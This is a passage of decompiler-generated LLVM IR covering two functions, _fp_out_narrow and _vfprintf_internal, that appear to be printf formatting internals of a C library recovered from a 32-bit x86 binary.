  uselistorder label %dec_label_pc_804e913, { 1, 0 }
}

define i32 @_fp_out_narrow(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @esi, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v3_804e941 = trunc i32 %arg2 to i8
  %v5_804e941 = icmp slt i8 %v3_804e941, 0
  %v1_804e943 = icmp eq i1 %v5_804e941, false
  %tmp18 = ptrtoint i8* %arg1 to i32
  br i1 %v1_804e943, label %dec_label_pc_804e96f, label %dec_label_pc_804e945

dec_label_pc_804e945:                             ; preds = %entry
  %v8_804e945 = inttoptr i32 %arg4 to i8*
  %v3_804e949 = call i32 @strlen(i8* %v8_804e945)
  store i32 %v3_804e949, i32* @edi, align 4
  %v0_804e951 = load i32, i32* @ebx, align 4
  %v2_804e951 = sub i32 %v0_804e951, %v3_804e949
  store i32 %v2_804e951, i32* @ebx, align 4
  %tmp19 = icmp slt i32 %v2_804e951, 1
  br i1 %tmp19, label %dec_label_pc_804e96d, label %dec_label_pc_804e957

dec_label_pc_804e957:                             ; preds = %dec_label_pc_804e945
  %v0_804e957 = load i32, i32* @esi, align 4
  %v1_804e957 = urem i32 %v0_804e957, 128
  store i32 %v1_804e957, i32* @esi, align 4
  store i32 %v2_804e951, i32* @ecx, align 4
  store i32 %v1_804e957, i32* @edx, align 4
  store i32 %tmp18, i32* @eax, align 4
  %v0_804e962 = call i32 @_charpad()
  store i32 %v0_804e962, i32* @ebp, align 4
  %v12_804e969 = icmp eq i32 %v0_804e962, %v2_804e951
  %v1_804e96b = icmp eq i1 %v12_804e969, false
  br i1 %v1_804e96b, label %dec_label_pc_804e988, label %dec_label_pc_804e957.dec_label_pc_804e96d_crit_edge

dec_label_pc_804e957.dec_label_pc_804e96d_crit_edge: ; preds = %dec_label_pc_804e957
  %v0_804e96d.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e96d

dec_label_pc_804e96d:                             ; preds = %dec_label_pc_804e957.dec_label_pc_804e96d_crit_edge, %dec_label_pc_804e945
  %v0_804e96d = phi i32 [ %v0_804e96d.pre, %dec_label_pc_804e957.dec_label_pc_804e96d_crit_edge ], [ %v3_804e949, %dec_label_pc_804e945 ]
  store i32 %v0_804e96d, i32* @ebx, align 4
  br label %dec_label_pc_804e96f

dec_label_pc_804e96f:                             ; preds = %entry, %dec_label_pc_804e96d
  %v0_804e979 = phi i32 [ %arg3, %entry ], [ %v0_804e96d, %dec_label_pc_804e96d ]
  %tmp20 = icmp slt i32 %v0_804e979, 1
  br i1 %tmp20, label %dec_label_pc_804e986, label %dec_label_pc_804e975

dec_label_pc_804e975:                             ; preds = %dec_label_pc_804e96f
  %v4_804e97e = inttoptr i32 %arg4 to i8*
  %v5_804e97e = call i32 @__stdio_fwrite(i8* %v4_804e97e, i32 %v0_804e979, i32 %tmp18)
  br label %dec_label_pc_804e986

dec_label_pc_804e986:                             ; preds = %dec_label_pc_804e96f, %dec_label_pc_804e975
  %v1_804e986 = phi i32 [ 0, %dec_label_pc_804e96f ], [ %v5_804e97e, %dec_label_pc_804e975 ]
  %v0_804e986 = load i32, i32* @ebp, align 4
  %v2_804e986 = add i32 %v0_804e986, %v1_804e986
  br label %dec_label_pc_804e988

dec_label_pc_804e988:                             ; preds = %dec_label_pc_804e957, %dec_label_pc_804e986
  %v0_804e988 = phi i32 [ %v0_804e962, %dec_label_pc_804e957 ], [ %v2_804e986, %dec_label_pc_804e986 ]
  ret i32 %v0_804e988

; uselistorder directives
  uselistorder i32 %v0_804e979, { 1, 0 }
  uselistorder i32 %v0_804e962, { 1, 0, 2 }
  uselistorder i32 %v1_804e957, { 1, 0 }
  uselistorder i32 %v2_804e951, { 0, 2, 1, 3 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_804e988, { 1, 0 }
  uselistorder label %dec_label_pc_804e986, { 1, 0 }
  uselistorder label %dec_label_pc_804e96f, { 1, 0 }
}

define i32 @_vfprintf_internal(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-376 = alloca i32, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v2_804e9a1 = ptrtoint i32* %stack_var_-364 to i32
  store i32 %v2_804e9a1, i32* @esi, align 4
  %v3_804e9a6 = bitcast i32* %stack_var_-364 to i8*
  %v4_804e9a6 = call i32 @_ppfs_init(i8* %v3_804e9a6, i32 %arg2)
  store i32 %v4_804e9a6, i32* %eax.global-to-local, align 4
  store i32 %v2_804e9a1, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v2_804e9ad = icmp slt i32 %v4_804e9a6, 0
  %v1_804e9af = icmp eq i1 %v2_804e9ad, false
  %tmp72 = ptrtoint i8* %arg1 to i32
  br i1 %v1_804e9af, label %dec_label_pc_804e9e9, label %dec_label_pc_804e9b1

dec_label_pc_804e9b1:                             ; preds = %entry
  %v3_804e9b1 = load i32, i32* %stack_var_-364, align 4
  store i32 %v3_804e9b1, i32* @ebx, align 4
  %v5_804e9b5 = inttoptr i32 %v3_804e9b1 to i8*
  %v3_804e9b6 = call i32 @strlen(i8* %v5_804e9b5)
  store i32 %v3_804e9b6, i32* %eax.global-to-local, align 4
  store i32 %v3_804e9b1, i32* @esi, align 4
  store i32 -1, i32* %stack_var_-376, align 4
  %v1_804e9c3 = icmp eq i32 %v3_804e9b6, 0
  br i1 %v1_804e9c3, label %dec_label_pc_804ef8a, label %dec_label_pc_804e9cb

dec_label_pc_804e9cb:                             ; preds = %dec_label_pc_804e9b1
  %v0_804e9d3 = load i32, i32* @ebx, align 4
  %v4_804e9d4 = inttoptr i32 %v0_804e9d3 to i8*
  %v5_804e9d4 = call i32 @__stdio_fwrite(i8* %v4_804e9d4, i32 %v3_804e9b6, i32 %tmp72)
  store i32 %v5_804e9d4, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-376, align 4
  br label %dec_label_pc_804ef8a

dec_label_pc_804e9e9:                             ; preds = %entry
  %v3_804e9f1 = call i32 @_ppfs_prepargs(i32 %v2_804e9a1, i32 %arg3)
  %v0_804e9f6 = load i32, i32* @ebx, align 4
  store i32 %v0_804e9f6, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-376, align 4
  store i32 %v2_804e9a1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ea05

dec_label_pc_804ea04:                             ; preds = %dec_label_pc_804ea0b
  %v1_804ea04 = add i32 %v0_804ea13, 1
  store i32 %v1_804ea04, i32* @ebx, align 4
  br label %dec_label_pc_804ea05.backedge

dec_label_pc_804ea05.backedge:                    ; preds = %dec_label_pc_804ea04, %dec_label_pc_804ef70, %dec_label_pc_804ef7b
  %v1_804ea0f29 = phi i32 [ %v1_804ea15, %dec_label_pc_804ea04 ], [ %v3_804ef70, %dec_label_pc_804ef70 ], [ %v1_804ea42, %dec_label_pc_804ef7b ]
  %v0_804ea0527 = phi i32 [ %v1_804ea04, %dec_label_pc_804ea04 ], [ %v3_804ef70, %dec_label_pc_804ef70 ], [ %v1_804ef7b, %dec_label_pc_804ef7b ]
  %v4_804ea05.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ea05

dec_label_pc_804ea05:                             ; preds = %dec_label_pc_804ea05.backedge, %dec_label_pc_804e9e9
  %v1_804ea15 = phi i32 [ %v1_804ea0f29, %dec_label_pc_804ea05.backedge ], [ %v0_804e9f6, %dec_label_pc_804e9e9 ]
  %v0_804ea13 = phi i32 [ %v0_804ea0527, %dec_label_pc_804ea05.backedge ], [ %v0_804e9f6, %dec_label_pc_804e9e9 ]
  %v4_804ea05 = phi i32 [ %v4_804ea05.pre, %dec_label_pc_804ea05.backedge ], [ %v2_804e9a1, %dec_label_pc_804e9e9 ]
  %v1_804ea05 = inttoptr i32 %v0_804ea13 to i8*
  %v2_804ea05 = load i8, i8* %v1_804ea05, align 1
  %v3_804ea05 = zext i8 %v2_804ea05 to i32
  %v5_804ea05 = and i32 %v4_804ea05, -256
  %v6_804ea05 = or i32 %v3_804ea05, %v5_804ea05
  store i32 %v6_804ea05, i32* %eax.global-to-local, align 4
  %v4_804ea07 = icmp eq i8 %v2_804ea05, 0
  br i1 %v4_804ea07, label %dec_label_pc_804ea0f, label %dec_label_pc_804ea0b

dec_label_pc_804ea0b:                             ; preds = %dec_label_pc_804ea05
  %v10_804ea0b = icmp eq i8 %v2_804ea05, 37
  %v1_804ea0d = icmp eq i1 %v10_804ea0b, false
  br i1 %v1_804ea0d, label %dec_label_pc_804ea04, label %dec_label_pc_804ea0f

dec_label_pc_804ea0f:                             ; preds = %dec_label_pc_804ea0b, %dec_label_pc_804ea05
  %v2_804ea0f = sub i32 %v0_804ea13, %v1_804ea15
  %v12_804ea0f = icmp eq i32 %v2_804ea0f, 0
  br i1 %v12_804ea0f, label %dec_label_pc_804ea39, label %dec_label_pc_804ea13

dec_label_pc_804ea13:                             ; preds = %dec_label_pc_804ea0f
  %v13_804ea0f = icmp slt i32 %v2_804ea0f, 0
  store i32 %v2_804ea0f, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v13_804ea0f, label %dec_label_pc_804ea2e, label %dec_label_pc_804ea1d

dec_label_pc_804ea1d:                             ; preds = %dec_label_pc_804ea13
  %v0_804ea1d = load i32, i32* @esp, align 4
  %v1_804ea1d = add i32 %v0_804ea1d, 380
  %v2_804ea1d = inttoptr i32 %v1_804ea1d to i32*
  %v3_804ea1d = load i32, i32* %v2_804ea1d, align 4
  %v5_804ea1d = add i32 %v0_804ea1d, -4
  %v6_804ea1d = inttoptr i32 %v5_804ea1d to i32*
  store i32 %v3_804ea1d, i32* %v6_804ea1d, align 4
  %v0_804ea24 = load i32, i32* @esi, align 4
  %v2_804ea24 = add i32 %v0_804ea1d, -8
  %v3_804ea24 = inttoptr i32 %v2_804ea24 to i32*
  store i32 %v0_804ea24, i32* %v3_804ea24, align 4
  %v0_804ea25 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ea25 = add i32 %v0_804ea1d, -12
  %v3_804ea25 = inttoptr i32 %v2_804ea25 to i32*
  store i32 %v0_804ea25, i32* %v3_804ea25, align 4
  %v0_804ea26 = load i32, i32* %stack_var_-376, align 4
  %v3_804ea26 = inttoptr i32 %v0_804ea26 to i8*
  %v4_804ea26 = call i32 @__stdio_fwrite(i8* %v3_804ea26, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ea26, i32* %eax.global-to-local, align 4
  %v1_804ea2e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ea2e

dec_label_pc_804ea2e:                             ; preds = %dec_label_pc_804ea13, %dec_label_pc_804ea1d
  %v1_804ea2e = phi i32 [ %v2_804ea0f, %dec_label_pc_804ea13 ], [ %v1_804ea2e.pre, %dec_label_pc_804ea1d ]
  %v3_804ea36 = phi i32 [ 0, %dec_label_pc_804ea13 ], [ %v4_804ea26, %dec_label_pc_804ea1d ]
  %v12_804ea2e = icmp eq i32 %v3_804ea36, %v1_804ea2e
  %v1_804ea30 = icmp eq i1 %v12_804ea2e, false
  %v0_804ef83.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804ea30, label %dec_label_pc_804ef83, label %dec_label_pc_804ea36

dec_label_pc_804ea36:                             ; preds = %dec_label_pc_804ea2e
  %v1_804ea36 = inttoptr i32 %v0_804ef83.pre.pre to i32*
  %v2_804ea36 = load i32, i32* %v1_804ea36, align 4
  %v4_804ea36 = add i32 %v2_804ea36, %v3_804ea36
  store i32 %v4_804ea36, i32* %v1_804ea36, align 4
  %v0_804ea39.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ea39

dec_label_pc_804ea39:                             ; preds = %dec_label_pc_804ea0f, %dec_label_pc_804ea36
  %v0_804ef7b = phi i32 [ %v0_804ea13, %dec_label_pc_804ea0f ], [ %v0_804ea39.pre, %dec_label_pc_804ea36 ]
  %v1_804ea39 = inttoptr i32 %v0_804ef7b to i8*
  %v2_804ea39 = load i8, i8* %v1_804ea39, align 1
  %v3_804ea39 = icmp eq i8 %v2_804ea39, 0
  br i1 %v3_804ea39, label %dec_label_pc_804ef8a, label %dec_label_pc_804ea42

dec_label_pc_804ea42:                             ; preds = %dec_label_pc_804ea39
  %v1_804ea42 = add i32 %v0_804ef7b, 1
  store i32 %v1_804ea42, i32* %edx.global-to-local, align 4
  %v2_804ea45 = inttoptr i32 %v1_804ea42 to i8*
  %v3_804ea45 = load i8, i8* %v2_804ea45, align 1
  %v12_804ea45 = icmp eq i8 %v3_804ea45, 37
  br i1 %v12_804ea45, label %dec_label_pc_804ef7b, label %dec_label_pc_804ea4f

dec_label_pc_804ea4f:                             ; preds = %dec_label_pc_804ea42
  %v1_804ea4f = load i32, i32* @esp, align 4
  %v2_804ea4f = add i32 %v1_804ea4f, 12
  %v3_804ea4f = inttoptr i32 %v2_804ea4f to i32*
  store i32 %v1_804ea42, i32* %v3_804ea4f, align 4
  %v0_804ea53 = load i32, i32* @esp, align 4
  %v1_804ea53 = add i32 %v0_804ea53, 356
  %v2_804ea53 = inttoptr i32 %v1_804ea53 to i32*
  store i32 0, i32* %v2_804ea53, align 4
  %v0_804ea5e = load i32, i32* @esp, align 4
  %v1_804ea5e = add i32 %v0_804ea5e, 12
  store i32 %v1_804ea5e, i32* %eax.global-to-local, align 4
  %v2_804ea62 = add i32 %v0_804ea5e, -4
  %v3_804ea62 = inttoptr i32 %v2_804ea62 to i32*
  store i32 %v1_804ea5e, i32* %v3_804ea62, align 4
  %v0_804ea63 = load i32, i32* %stack_var_-376, align 4
  %v1_804ea63 = call i32 @_ppfs_parsespec(i32 %v0_804ea63)
  store i32 %v1_804ea63, i32* %eax.global-to-local, align 4
  %v0_804ea68 = load i32, i32* @esp, align 4
  %v1_804ea68 = add i32 %v0_804ea68, 16
  store i32 %v1_804ea68, i32* %edx.global-to-local, align 4
  %v2_804ea6c = add i32 %v0_804ea68, -4
  %v3_804ea6c = inttoptr i32 %v2_804ea6c to i32*
  store i32 %v1_804ea68, i32* %v3_804ea6c, align 4
  %v0_804ea6d = load i32, i32* %stack_var_-376, align 4
  %v3_804ea6d = call i32 @_ppfs_setargs(i32 %v0_804ea6d, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804ea6d, i32* %eax.global-to-local, align 4
  %v0_804ea72 = load i32, i32* @esp, align 4
  %v1_804ea72 = add i32 %v0_804ea72, 58
  %v2_804ea72 = inttoptr i32 %v1_804ea72 to i8*
  %v3_804ea72 = load i8, i8* %v2_804ea72, align 1
  %v4_804ea72 = zext i8 %v3_804ea72 to i32
  store i32 %v4_804ea72, i32* @ebp, align 4
  %v1_804ea77 = inttoptr i32 %v0_804ea72 to i32*
  %v2_804ea77 = load i32, i32* %v1_804ea77, align 4
  store i32 %v2_804ea77, i32* @edi, align 4
  %v3_804ea77 = add i32 %v0_804ea72, 4
  %v1_804ea78 = inttoptr i32 %v3_804ea77 to i32*
  %v2_804ea78 = load i32, i32* %v1_804ea78, align 4
  store i32 %v2_804ea78, i32* %eax.global-to-local, align 4
  %v3_804ea78 = add i32 %v0_804ea72, 8
  %v1_804ea79 = add i32 %v0_804ea72, 100
  store i32 %v1_804ea79, i32* %edx.global-to-local, align 4
  %v1_804ea7d = add i32 %v0_804ea72, 44
  %v2_804ea7d = inttoptr i32 %v1_804ea7d to i32*
  %v3_804ea7d = load i32, i32* %v2_804ea7d, align 4
  %tmp74 = icmp slt i32 %v3_804ea7d, 1
  br i1 %tmp74, label %dec_label_pc_804ea8b, label %dec_label_pc_804ea84

dec_label_pc_804ea84:                             ; preds = %dec_label_pc_804ea4f
  %v3_804ea84 = mul nuw nsw i32 %v4_804ea72, 12
  store i32 %v3_804ea84, i32* %eax.global-to-local, align 4
  %v2_804ea87 = add i32 %v0_804ea72, 88
  %v3_804ea87 = add i32 %v2_804ea87, %v3_804ea84
  store i32 %v3_804ea87, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ea8b

dec_label_pc_804ea8b:                             ; preds = %dec_label_pc_804ea4f, %dec_label_pc_804ea84
  %v0_804ea8f36 = phi i32 [ %v1_804ea79, %dec_label_pc_804ea4f ], [ %v3_804ea87, %dec_label_pc_804ea84 ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804ea9a82 = add i32 %v0_804ea72, 48
  %v3_804ea9a83 = inttoptr i32 %v2_804ea9a82 to i32*
  %v4_804ea9a84 = load i32, i32* %v3_804ea9a83, align 4
  %v5_804ea9a85 = sub i32 0, %v4_804ea9a84
  %v13_804ea9a88 = and i32 %v4_804ea9a84, %v5_804ea9a85
  %v14_804ea9a89 = icmp slt i32 %v13_804ea9a88, 0
  %v16_804ea9a90 = icmp slt i32 %v5_804ea9a85, 0
  %v2_804ea9e91 = icmp eq i1 %v16_804ea9a90, %v14_804ea9a89
  br i1 %v2_804ea9e91, label %dec_label_pc_804eaa0, label %dec_label_pc_804ea8f

dec_label_pc_804ea8f:                             ; preds = %dec_label_pc_804ea8b, %dec_label_pc_804ea8f
  %v5_804ead794 = phi i32 [ %v1_804ea99, %dec_label_pc_804ea8f ], [ 0, %dec_label_pc_804ea8b ]
  %v0_804eb2993 = phi i32 [ %v1_804ea9a.pre, %dec_label_pc_804ea8f ], [ %v3_804ea78, %dec_label_pc_804ea8b ]
  %v0_804ea8f92 = phi i32 [ %v1_804ea96, %dec_label_pc_804ea8f ], [ %v0_804ea8f36, %dec_label_pc_804ea8b ]
  %v3_804ea8f = mul i32 %v5_804ead794, 4
  %v4_804ea8f = add i32 %v0_804eb2993, 328
  %v5_804ea8f = add i32 %v4_804ea8f, %v3_804ea8f
  %v6_804ea8f = inttoptr i32 %v5_804ea8f to i32*
  store i32 %v0_804ea8f92, i32* %v6_804ea8f, align 4
  %v0_804ea96 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ea96 = add i32 %v0_804ea96, 12
  store i32 %v1_804ea96, i32* %edx.global-to-local, align 4
  %v0_804ea99 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea99 = add i32 %v0_804ea99, 1
  %v1_804ea9a.pre = load i32, i32* @esp, align 4
  store i32 %v1_804ea99, i32* %eax.global-to-local, align 4
  %v2_804ea9a = add i32 %v1_804ea9a.pre, 40
  %v3_804ea9a = inttoptr i32 %v2_804ea9a to i32*
  %v4_804ea9a = load i32, i32* %v3_804ea9a, align 4
  %v5_804ea9a = sub i32 %v1_804ea99, %v4_804ea9a
  %v11_804ea9a = xor i32 %v4_804ea9a, %v1_804ea99
  %v12_804ea9a = xor i32 %v5_804ea9a, %v1_804ea99
  %v13_804ea9a = and i32 %v12_804ea9a, %v11_804ea9a
  %v14_804ea9a = icmp slt i32 %v13_804ea9a, 0
  %v16_804ea9a = icmp slt i32 %v5_804ea9a, 0
  %v2_804ea9e = icmp eq i1 %v16_804ea9a, %v14_804ea9a
  br i1 %v2_804ea9e, label %dec_label_pc_804eaa0, label %dec_label_pc_804ea8f

dec_label_pc_804eaa0:                             ; preds = %dec_label_pc_804ea8f, %dec_label_pc_804ea8b
  %v0_804eb29.lcssa = phi i32 [ %v3_804ea78, %dec_label_pc_804ea8b ], [ %v1_804ea9a.pre, %dec_label_pc_804ea8f ]
  %v5_804ead7.lcssa = phi i32 [ 0, %dec_label_pc_804ea8b ], [ %v1_804ea99, %dec_label_pc_804ea8f ]
  %v1_804eaa0 = add i32 %v0_804eb29.lcssa, 44
  %v2_804eaa0 = inttoptr i32 %v1_804eaa0 to i32*
  %v3_804eaa0 = load i32, i32* %v2_804eaa0, align 4
  store i32 %v3_804eaa0, i32* @ecx, align 4
  %v1_804eaa4 = icmp eq i32 %v3_804eaa0, 0
  %v1_804eaa6 = icmp eq i1 %v1_804eaa4, false
  br i1 %v1_804eaa6, label %dec_label_pc_804eace, label %dec_label_pc_804eaa8

dec_label_pc_804eaa8:                             ; preds = %dec_label_pc_804eaa0
  %v1_804eaa8 = inttoptr i32 %v0_804eb29.lcssa to i32*
  %v2_804eaa8 = load i32, i32* %v1_804eaa8, align 4
  store i32 %v2_804eaa8, i32* %eax.global-to-local, align 4
  %v1_804eaab = ashr i32 %v2_804eaa8, 31
  store i32 %v1_804eaab, i32* %edx.global-to-local, align 4
  %v2_804eaac = add i32 %v0_804eb29.lcssa, -4
  %v3_804eaac = inttoptr i32 %v2_804eaac to i32*
  store i32 %v1_804eaab, i32* %v3_804eaac, align 4
  %v0_804eaad = load i32, i32* %eax.global-to-local, align 4
  %v2_804eaad = add i32 %v0_804eb29.lcssa, -8
  %v3_804eaad = inttoptr i32 %v2_804eaad to i32*
  store i32 %v0_804eaad, i32* %v3_804eaad, align 4
  %v1_804eaae = add i32 %v0_804eb29.lcssa, 28
  %v2_804eaae = inttoptr i32 %v1_804eaae to i32*
  %v3_804eaae = load i32, i32* %v2_804eaae, align 4
  %v1_804eab2 = and i32 %v3_804eaae, 3840
  store i32 %v1_804eab2, i32* %eax.global-to-local, align 4
  %v2_804eab7 = add i32 %v0_804eb29.lcssa, -12
  %v3_804eab7 = inttoptr i32 %v2_804eab7 to i32*
  store i32 %v1_804eab2, i32* %v3_804eab7, align 4
  %v1_804eab8 = add i32 %v0_804eb29.lcssa, 328
  %v2_804eab8 = inttoptr i32 %v1_804eab8 to i32*
  %v3_804eab8 = load i32, i32* %v2_804eab8, align 4
  store i32 %v3_804eab8, i32* %eax.global-to-local, align 4
  %v1_804eabf = inttoptr i32 %v3_804eab8 to i32*
  %v2_804eabf = load i32, i32* %v1_804eabf, align 4
  %v4_804eabf = add i32 %v0_804eb29.lcssa, -16
  %v5_804eabf = inttoptr i32 %v4_804eabf to i32*
  store i32 %v2_804eabf, i32* %v5_804eabf, align 4
  %v0_804eac1 = call i32 @_store_inttype()
  store i32 %v0_804eac1, i32* %eax.global-to-local, align 4
  %v0_804eac6 = load i32, i32* @esp, align 4
  %v1_804eac6 = add i32 %v0_804eac6, 16
  br label %dec_label_pc_804ef70

dec_label_pc_804eace:                             ; preds = %dec_label_pc_804eaa0
  %tmp96 = icmp ult i32 %v3_804eaa0, 8
  br i1 %tmp96, label %dec_label_pc_804ead7, label %dec_label_pc_804ec2d

dec_label_pc_804ead7:                             ; preds = %dec_label_pc_804eace
  %v1_804ead7 = add i32 %v3_804eaa0, 134550319
  %v2_804ead7 = inttoptr i32 %v1_804ead7 to i8*
  %v3_804ead7 = load i8, i8* %v2_804ead7, align 1
  %v4_804ead7 = zext i8 %v3_804ead7 to i32
  %v6_804ead7 = and i32 %v5_804ead7.lcssa, -256
  %v7_804ead7 = or i32 %v4_804ead7, %v6_804ead7
  store i32 %v7_804ead7, i32* %eax.global-to-local, align 4
  store i32 %v4_804ead7, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v10_804eae5 = icmp eq i8 %v3_804ead7, 10
  %v1_804eae7 = icmp eq i1 %v10_804eae5, false
  br i1 %v1_804eae7, label %dec_label_pc_804eb05, label %dec_label_pc_804eae9

dec_label_pc_804eae9:                             ; preds = %dec_label_pc_804ead7
  %v1_804eae9 = add i32 %v0_804eb29.lcssa, 28
  %v2_804eae9 = inttoptr i32 %v1_804eae9 to i32*
  %v3_804eae9 = load i32, i32* %v2_804eae9, align 4
  %v1_804eaef = and i32 %v3_804eae9, 32
  store i32 %v1_804eaef, i32* %eax.global-to-local, align 4
  %tmp75 = udiv i32 %v1_804eaef, 32
  %tmp76 = sub nsw i32 45, %tmp75
  store i32 %tmp76, i32* @ebx, align 4
  %v1_804eafd = trunc i32 %v3_804eae9 to i8
  %v2_804eafd = and i8 %v1_804eafd, 64
  %v3_804eafd = icmp eq i8 %v2_804eafd, 0
  %v5_804eafd = zext i8 %v2_804eafd to i32
  %v7_804eafd = and i32 %v3_804eae9, -256
  %v8_804eafd = or i32 %v5_804eafd, %v7_804eafd
  store i32 %v8_804eafd, i32* %edx.global-to-local, align 4
  br i1 %v3_804eafd, label %dec_label_pc_804eb05, label %dec_label_pc_804eb02

dec_label_pc_804eb02:                             ; preds = %dec_label_pc_804eae9
  %v2_804eb02 = or i32 %tmp76, 128
  store i32 %v2_804eb02, i32* @ebx, align 4
  br label %dec_label_pc_804eb05

dec_label_pc_804eb05:                             ; preds = %dec_label_pc_804eae9, %dec_label_pc_804ead7, %dec_label_pc_804eb02
  %tmp97 = icmp ult i32 %v3_804eaa0, 6
  br i1 %tmp97, label %dec_label_pc_804eb0a, label %dec_label_pc_804eb22

dec_label_pc_804eb0a:                             ; preds = %dec_label_pc_804eb05
  %v9_804eb0a = icmp eq i32 %v3_804eaa0, 3
  %v1_804eb0d = icmp eq i1 %v9_804eb0a, false
  br i1 %v1_804eb0d, label %dec_label_pc_804eb16, label %dec_label_pc_804eb0f

dec_label_pc_804eb0f:                             ; preds = %dec_label_pc_804eb0a
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804eb24

dec_label_pc_804eb16:                             ; preds = %dec_label_pc_804eb0a
  %v9_804eb1b = icmp eq i32 %v3_804eaa0, 1
  br i1 %v9_804eb1b, label %dec_label_pc_804eb29, label %dec_label_pc_804eb24

dec_label_pc_804eb22:                             ; preds = %dec_label_pc_804eb05
  %v1_804eb22 = sub nsw i32 0, %v4_804ead7
  store i32 %v1_804eb22, i32* @esi, align 4
  br label %dec_label_pc_804eb24

dec_label_pc_804eb24:                             ; preds = %dec_label_pc_804eb16, %dec_label_pc_804eb0f, %dec_label_pc_804eb22
  br label %dec_label_pc_804eb29

dec_label_pc_804eb29:                             ; preds = %dec_label_pc_804eb16, %dec_label_pc_804eb24
  %storemerge109 = phi i32 [ 11, %dec_label_pc_804eb24 ], [ 6, %dec_label_pc_804eb16 ]
  store i32 %storemerge109, i32* @edi, align 4
  %v1_804eb29 = add i32 %v0_804eb29.lcssa, 7
  %v2_804eb29 = inttoptr i32 %v1_804eb29 to i8*
  store i8 32, i8* %v2_804eb29, align 1
  %v0_804eb2e = load i32, i32* @esp, align 4
  %v1_804eb2e = add i32 %v0_804eb2e, 16
  %v2_804eb2e = inttoptr i32 %v1_804eb2e to i32*
  %v3_804eb2e = load i32, i32* %v2_804eb2e, align 4
  %v5_804eb2e = icmp slt i32 %v3_804eb2e, 0
  %v1_804eb33 = icmp eq i1 %v5_804eb2e, false
  br i1 %v1_804eb33, label %dec_label_pc_804eb3d, label %dec_label_pc_804eb35

dec_label_pc_804eb35:                             ; preds = %dec_label_pc_804eb29
  %v1_804eb35 = add i32 %v0_804eb2e, 32
  %v2_804eb35 = inttoptr i32 %v1_804eb35 to i8*
  %v3_804eb35 = load i8, i8* %v2_804eb35, align 1
  %v4_804eb35 = zext i8 %v3_804eb35 to i32
  %v5_804eb35 = load i32, i32* %edx.global-to-local, align 4
  %v6_804eb35 = and i32 %v5_804eb35, -256
  %v7_804eb35 = or i32 %v6_804eb35, %v4_804eb35
  store i32 %v7_804eb35, i32* %edx.global-to-local, align 4
  %v3_804eb39 = add i32 %v0_804eb2e, 7
  %v4_804eb39 = inttoptr i32 %v3_804eb39 to i8*
  store i8 %v3_804eb35, i8* %v4_804eb39, align 1
  %v0_804eb3d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804eb3d

dec_label_pc_804eb3d:                             ; preds = %dec_label_pc_804eb29, %dec_label_pc_804eb35
  %v1_804eb56 = phi i32 [ %v0_804eb2e, %dec_label_pc_804eb29 ], [ %v0_804eb3d.pre, %dec_label_pc_804eb35 ]
  %v1_804eb3d = add i32 %v1_804eb56, 328
  %v2_804eb3d = inttoptr i32 %v1_804eb3d to i32*
  %v3_804eb3d = load i32, i32* %v2_804eb3d, align 4
  store i32 %v3_804eb3d, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v8_804eb49 = icmp eq i32 %v3_804eaa0, 1
  br i1 %v8_804eb49, label %dec_label_pc_804eb56, label %dec_label_pc_804eb4c

dec_label_pc_804eb4c:                             ; preds = %dec_label_pc_804eb3d
  %v1_804eb4c = load i32, i32* @ebp, align 4
  %v2_804eb4c = mul i32 %v1_804eb4c, 4
  %v3_804eb4c = add i32 %v1_804eb56, 48
  %v4_804eb4c = add i32 %v3_804eb4c, %v2_804eb4c
  %v5_804eb4c = inttoptr i32 %v4_804eb4c to i32*
  %v6_804eb4c = load i32, i32* %v5_804eb4c, align 4
  %v1_804eb50 = and i32 %v6_804eb4c, 3840
  store i32 %v1_804eb50, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804eb56

dec_label_pc_804eb56:                             ; preds = %dec_label_pc_804eb3d, %dec_label_pc_804eb4c
  %v0_804eb56 = load i32, i32* @esi, align 4
  %v2_804eb56 = add i32 %v1_804eb56, -4
  %v3_804eb56 = inttoptr i32 %v2_804eb56 to i32*
  store i32 %v0_804eb56, i32* %v3_804eb56, align 4
  %v0_804eb57 = load i32, i32* %eax.global-to-local, align 4
  %v2_804eb57 = add i32 %v1_804eb56, -8
  %v3_804eb57 = inttoptr i32 %v2_804eb57 to i32*
  store i32 %v0_804eb57, i32* %v3_804eb57, align 4
  %v0_804eb58 = load i32, i32* %edx.global-to-local, align 4
  %v2_804eb58 = add i32 %v1_804eb56, -12
  %v3_804eb58 = inttoptr i32 %v2_804eb58 to i32*
  store i32 %v0_804eb58, i32* %v3_804eb58, align 4
  %v0_804eb59 = call i32 @_load_inttype()
  %v0_804eb5e = load i32, i32* @ebx, align 4
  %v1_804eb5e = load i32, i32* @esp, align 4
